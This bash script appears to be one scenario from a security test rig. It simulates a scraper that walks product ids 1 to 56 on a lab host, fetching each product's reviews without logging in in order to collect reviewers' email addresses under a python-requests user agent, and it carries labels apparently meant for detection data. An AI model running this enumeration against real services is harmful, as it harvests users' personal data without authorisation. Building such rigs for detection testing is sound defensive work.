#!/usr/bin/env bash
# TAP-03 variant a (PRD §4.1, KI-59): a scraper walks the product ids, GET /rest/products/<id>/reviews for
# every product (1 to 56), 1 s apart. No login; each review names its author by email. A python-requests
# user agent, as a scraper's. Runs inside the rig's tools container only.
# tool: curl 8.x (lib/capture.sh)
# label: leaky tap: reviews of products 1 to 56 walked, python-requests user agent
set -eu
. /attacks/lib/capture.sh
for id in $(seq 56); do
  [ "$id" -gt 1 ] && sleep 1
  req -A 'python-requests/2.32.3' "http://10.66.0.10/rest/products/$id/reviews"
done
cut -f2- /out/responses/index.tsv
